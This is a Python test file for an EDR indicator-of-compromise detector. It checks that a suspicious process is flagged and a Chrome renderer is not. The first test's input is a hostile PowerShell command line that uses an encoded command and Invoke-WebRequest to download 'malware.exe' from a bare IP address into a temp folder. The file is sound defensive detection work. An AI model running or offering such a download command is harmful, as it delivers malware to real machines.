from edr.ioc import detect_ioc


def test_detect_ioc_flags_common_malware_behavior():
    result = detect_ioc(
        process_name="powershell.exe",
        command_line="powershell -enc aQBlAHgAIAAkAHM= ; Invoke-WebRequest http://1.2.3.4/malware.exe -OutFile C:\\temp\\malware.exe",
        parent_name="explorer.exe",
    )

    assert result["suspicious"] is True
    assert result["risk_score"] >= 50
    assert "powershell" in result["matched_iocs"]


def test_detect_ioc_clean_process_is_not_flagged():
    result = detect_ioc(
        process_name="chrome.exe",
        command_line="\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer",
        parent_name="explorer.exe",
    )

    assert result["suspicious"] is False
    assert result["risk_score"] == 0
